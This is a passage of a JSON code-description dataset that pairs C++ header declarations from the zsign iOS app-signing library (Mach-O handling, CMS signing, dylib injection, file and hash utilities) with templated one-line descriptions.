    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.h",
    "code_type": "function"
  },
  {
    "id": "671",
    "code": "class ZMachO\n{",
    "nl": "class ZMachO - implements functionality related to z mach o",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "class"
  },
  {
    "id": "672",
    "code": "bool Init(const char *szFile);",
    "nl": "Function Init - implements init functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "673",
    "code": "bool InitV(const char *szFormatPath, ...);",
    "nl": "Function InitV - implements initv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "674",
    "code": "bool Free();",
    "nl": "Function Free - implements free functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "675",
    "code": "void PrintInfo();",
    "nl": "Function PrintInfo - implements printinfo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "676",
    "code": "bool Sign(ZSignAsset *pSignAsset, bool bForce, string strBundleId, string strInfoPlistSHA1,\nstring strInfoPlistSHA256, const string &strCodeResourcesData);",
    "nl": "Function Sign - implements sign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "677",
    "code": "bool InjectDyLib(bool bWeakInject, const char *szDyLibPath, bool &bCreate);",
    "nl": "Function InjectDyLib - implements injectdylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "678",
    "code": "bool ChangeDylibPath(const char *oldPath, const char *newPath);",
    "nl": "Function ChangeDylibPath - implements changedylibpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "679",
    "code": "bool RemoveDylib(const std::set<std::string> &dylibNames);",
    "nl": "Function RemoveDylib - implements removedylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "680",
    "code": "bool OpenFile(const char *szPath);",
    "nl": "Function OpenFile - implements openfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "681",
    "code": "bool CloseFile();",
    "nl": "Function CloseFile - implements closefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "682",
    "code": "bool NewArchO(uint8_t *pBase, uint32_t uLength);",
    "nl": "Function NewArchO - implements newarcho functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "683",
    "code": "void FreeArchOes();",
    "nl": "Function FreeArchOes - implements freearchoes functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "684",
    "code": "bool ReallocCodeSignSpace();",
    "nl": "Function ReallocCodeSignSpace - implements realloccodesignspace functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.h",
    "code_type": "function"
  },
  {
    "id": "685",
    "code": "bool GetCertSubjectCN(const string &strCertData, string &strSubjectCN);",
    "nl": "Function GetCertSubjectCN - implements getcertsubjectcn functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "function"
  },
  {
    "id": "686",
    "code": "bool GetCMSInfo(uint8_t *pCMSData, uint32_t uCMSLength, JValue &jvOutput);",
    "nl": "Function GetCMSInfo - implements getcmsinfo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "function"
  },
  {
    "id": "687",
    "code": "bool GetCMSContent(const string &strCMSDataInput, string &strContentOutput);",
    "nl": "Function GetCMSContent - implements getcmscontent functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "function"
  },
  {
    "id": "688",
    "code": "bool GenerateCMS(const string &strSignerCertData, const string &strSignerPKeyData, const string &strCDHashData,\nconst string &strCDHashesPlist, string &strCMSOutput);",
    "nl": "Function GenerateCMS - implements generatecms functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "function"
  },
  {
    "id": "689",
    "code": "class ZSignAsset\n{",
    "nl": "class ZSignAsset - implements functionality related to z sign asset",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "class"
  },
  {
    "id": "690",
    "code": "bool GenerateCMS(const string &strCDHashData, const string &strCDHashesPlist,\nconst string &strCodeDirectorySlotSHA1, const string &strAltnateCodeDirectorySlot256,\nstring &strCMSOutput);",
    "nl": "Function GenerateCMS - implements generatecms functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "function"
  },
  {
    "id": "691",
    "code": "bool Init(const string &strSignerCertFile, const string &strSignerPKeyFile, const string &strProvisionFile,\nconst string &strEntitlementsFile, const string &strPassword);",
    "nl": "Function Init - implements init functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.h",
    "code_type": "function"
  },
  {
    "id": "692",
    "code": "bool ParseCodeSignature(uint8_t *pCSBase);",
    "nl": "Function ParseCodeSignature - implements parsecodesignature functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "693",
    "code": "bool SlotBuildEntitlements(const string &strEntitlements, string &strOutput);",
    "nl": "Function SlotBuildEntitlements - implements slotbuildentitlements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "694",
    "code": "bool SlotBuildDerEntitlements(const string &strEntitlements, string &strOutput);",
    "nl": "Function SlotBuildDerEntitlements - implements slotbuildderentitlements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "695",
    "code": "bool SlotBuildRequirements(const string &strBundleID, const string &strSubjectCN, string &strOutput);",
    "nl": "Function SlotBuildRequirements - implements slotbuildrequirements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "696",
    "code": "bool GetCodeSignatureCodeSlotsData(uint8_t *pCSBase, uint8_t *&pCodeSlots1, uint32_t &uCodeSlots1Length,\nuint8_t *&pCodeSlots256, uint32_t &uCodeSlots256Length);",
    "nl": "Function GetCodeSignatureCodeSlotsData - implements getcodesignaturecodeslotsdata functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "697",
    "code": "bool SlotBuildCodeDirectory(bool bAlternate, uint8_t *pCodeBase, uint32_t uCodeLength, uint8_t *pCodeSlotsData,\nuint32_t uCodeSlotsDataLength, uint64_t execSegLimit, uint64_t execSegFlags,\nconst string &strBundleId, const string &strTeamId, const string &strInfoPlistSHA,\nconst string &strRequirementsSlotSHA, const string &strCodeResourcesSHA,\nconst string &strEntitlementsSlotSHA, const string &strDerEntitlementsSlotSHA,\nbool isExecuteArch, string &strOutput);",
    "nl": "Function SlotBuildCodeDirectory - implements slotbuildcodedirectory functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "698",
    "code": "bool SlotBuildCMSSignature(ZSignAsset *pSignAsset, const string &strCodeDirectorySlot,\nconst string &strAltnateCodeDirectorySlot, string &strOutput);",
    "nl": "Function SlotBuildCMSSignature - implements slotbuildcmssignature functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "699",
    "code": "bool GetCodeSignatureExistsCodeSlotsData(uint8_t *pCSBase, uint8_t *&pCodeSlots1Data, uint32_t &uCodeSlots1DataLength,\nuint8_t *&pCodeSlots256Data, uint32_t &uCodeSlots256DataLength);",
    "nl": "Function GetCodeSignatureExistsCodeSlotsData - implements getcodesignatureexistscodeslotsdata functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "700",
    "code": "uint32_t GetCodeSignatureLength(uint8_t *pCSBase);",
    "nl": "Function GetCodeSignatureLength - implements getcodesignaturelength functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.h",
    "code_type": "function"
  },
  {
    "id": "701",
    "code": "class ZBase64\n{",
    "nl": "class ZBase64 - implements functionality related to z base",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.h",
    "code_type": "class"
  },
  {
    "id": "702",
    "code": "#define LE(x) _Swap(x)\n#define BE(x) _Swap(x)\n\n#if !defined(S_ISREG) && defined(S_IFMT) && defined(S_IFREG)\n#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)\n#endif\n\nuint16_t _Swap(uint16_t value);",
    "nl": "Function LE - implements le functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "703",
    "code": "#define BE(x) _Swap(x)\n\n#if !defined(S_ISREG) && defined(S_IFMT) && defined(S_IFREG)\n#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)\n#endif\n\nuint16_t _Swap(uint16_t value);",
    "nl": "Function BE - implements be functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "704",
    "code": "#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)\n#endif\n\nuint16_t _Swap(uint16_t value);",
    "nl": "Function S_ISREG - implements s isreg functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "705",
    "code": "uint16_t _Swap(uint16_t value);",
    "nl": "Function _Swap - implements  swap functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "706",
    "code": "uint32_t _Swap(uint32_t value);",
    "nl": "Function _Swap - implements  swap functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "707",
    "code": "uint64_t _Swap(uint64_t value);",
    "nl": "Function _Swap - implements  swap functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "708",
    "code": "bool ReadFile(const char *szFile, string &strData);",
    "nl": "Function ReadFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "709",
    "code": "bool ReadFile(string &strData, const char *szFormatPath, ...);",
    "nl": "Function ReadFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "710",
    "code": "bool WriteFile(const char *szFile, const string &strData);",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "711",
    "code": "bool WriteFile(const char *szFile, const char *szData, size_t sLen);",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "712",
    "code": "bool WriteFile(string &strData, const char *szFormatPath, ...);",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "713",
    "code": "bool WriteFile(const char *szData, size_t sLen, const char *szFormatPath, ...);",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "714",
    "code": "bool AppendFile(const char *szFile, const string &strData);",
    "nl": "Function AppendFile - implements appendfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "715",
    "code": "bool AppendFile(const char *szFile, const char *szData, size_t sLen);",
    "nl": "Function AppendFile - implements appendfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "716",
    "code": "bool AppendFile(const string &strData, const char *szFormatPath, ...);",
    "nl": "Function AppendFile - implements appendfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "717",
    "code": "bool IsRegularFile(const char *szFile);",
    "nl": "Function IsRegularFile - implements isregularfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "718",
    "code": "bool IsFolder(const char *szFolder);",
    "nl": "Function IsFolder - implements isfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "719",
    "code": "bool IsFolderV(const char *szFormatPath, ...);",
    "nl": "Function IsFolderV - implements isfolderv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "720",
    "code": "bool CreateFolder(const char *szFolder);",
    "nl": "Function CreateFolder - implements createfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "721",
    "code": "bool CreateFolderV(const char *szFormatPath, ...);",
    "nl": "Function CreateFolderV - implements createfolderv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "722",
    "code": "bool RemoveFile(const char *szFile);",
    "nl": "Function RemoveFile - implements removefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "723",
    "code": "bool RemoveFileV(const char *szFormatPath, ...);",
    "nl": "Function RemoveFileV - implements removefilev functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "724",
    "code": "bool RemoveFolder(const char *szFolder);",
    "nl": "Function RemoveFolder - implements removefolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "725",
    "code": "bool RemoveFolderV(const char *szFormatPath, ...);",
    "nl": "Function RemoveFolderV - implements removefolderv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "726",
    "code": "bool IsFileExists(const char *szFile);",
    "nl": "Function IsFileExists - implements isfileexists functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "727",
    "code": "bool IsFileExistsV(const char *szFormatPath, ...);",
    "nl": "Function IsFileExistsV - implements isfileexistsv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "728",
    "code": "int64_t GetFileSize(int fd);",
    "nl": "Function GetFileSize - implements getfilesize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "729",
    "code": "int64_t GetFileSize(const char *szFile);",
    "nl": "Function GetFileSize - implements getfilesize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "730",
    "code": "int64_t GetFileSizeV(const char *szFormatPath, ...);",
    "nl": "Function GetFileSizeV - implements getfilesizev functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "731",
    "code": "string GetFileSizeString(const char *szFile);",
    "nl": "Function GetFileSizeString - implements getfilesizestring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "732",
    "code": "bool IsZipFile(const char *szFile);",
    "nl": "Function IsZipFile - implements iszipfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "733",
    "code": "string GetCanonicalizePath(const char *szPath);",
    "nl": "Function GetCanonicalizePath - implements getcanonicalizepath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "734",
    "code": "bool IsPathSuffix(const string &strPath, const char *suffix);",
    "nl": "Function IsPathSuffix - implements ispathsuffix functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "735",
    "code": "void StringSplit(const string &src, const string &split, vector<string> &dest);",
    "nl": "Function StringSplit - implements stringsplit functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "736",
    "code": "string FormatSize(int64_t size, int64_t base = 1024);",
    "nl": "Function FormatSize - implements formatsize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "737",
    "code": "time_t GetUnixStamp();",
    "nl": "Function GetUnixStamp - implements getunixstamp functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "738",
    "code": "uint64_t GetMicroSecond();",
    "nl": "Function GetMicroSecond - implements getmicrosecond functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "739",
    "code": "bool SystemExec(const char *szFormatCmd, ...);",
    "nl": "Function SystemExec - implements systemexec functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "740",
    "code": "uint32_t ByteAlign(uint32_t uValue, uint32_t uAlign);",
    "nl": "Function ByteAlign - implements bytealign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "741",
    "code": "bool SHASum(int nSumType, uint8_t *data, size_t size, string &strOutput);",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "742",
    "code": "bool SHASum(int nSumType, const string &strData, string &strOutput);",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "743",
    "code": "bool SHASum(const string &strData, string &strSHA1, string &strSHA256);",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "744",
    "code": "bool SHA1Text(const string &strData, string &strOutput);",
    "nl": "Function SHA1Text - implements sha1text functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "745",
    "code": "bool SHASumFile(const char *szFile, string &strSHA1, string &strSHA256);",
    "nl": "Function SHASumFile - implements shasumfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "746",
    "code": "bool SHASumBase64(const string &strData, string &strSHA1Base64, string &strSHA256Base64);",
    "nl": "Function SHASumBase64 - implements shasumbase64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "747",
    "code": "bool SHASumBase64File(const char *szFile, string &strSHA1Base64, string &strSHA256Base64);",
    "nl": "Function SHASumBase64File - implements shasumbase64file functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "748",
    "code": "void PrintSHASum(const char *prefix, const uint8_t *hash, uint32_t size, const char *suffix = \"\\n\");",
    "nl": "Function PrintSHASum - implements printshasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "749",
    "code": "void PrintSHASum(const char *prefix, const string &strSHASum, const char *suffix = \"\\n\");",
    "nl": "Function PrintSHASum - implements printshasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "750",
    "code": "void PrintDataSHASum(const char *prefix, int nSumType, const string &strData, const char *suffix = \"\\n\");",
    "nl": "Function PrintDataSHASum - implements printdatashasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "751",
    "code": "void PrintDataSHASum(const char *prefix, int nSumType, uint8_t *data, size_t size, const char *suffix = \"\\n\");",
    "nl": "Function PrintDataSHASum - implements printdatashasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "752",
    "code": "class ZBuffer\n{",
    "nl": "class ZBuffer - implements functionality related to z buffer",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "class"
  },
  {
    "id": "753",
    "code": "void Free();",
    "nl": "Function Free - implements free functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "754",
    "code": "class ZTimer\n{",
    "nl": "class ZTimer - implements functionality related to z timer",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "class"
  },
  {
    "id": "755",
    "code": "uint64_t Reset();",
    "nl": "Function Reset - implements reset functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "756",
    "code": "uint64_t Print(const char *szFormatArgs, ...);",
    "nl": "Function Print - implements print functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "757",
    "code": "uint64_t PrintResult(bool bSuccess, const char *szFormatArgs, ...);",
    "nl": "Function PrintResult - implements printresult functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "758",
    "code": "class ZLog\n{",
    "nl": "class ZLog - implements functionality related to z log",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "class"
  },
  {
    "id": "759",
    "code": "static bool IsDebug();",
    "nl": "Function IsDebug - implements isdebug functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "760",
    "code": "static void Print(const char *szLog);",
    "nl": "Function Print - implements print functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "761",
    "code": "static void PrintV(const char *szFormatArgs, ...);",
    "nl": "Function PrintV - implements printv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
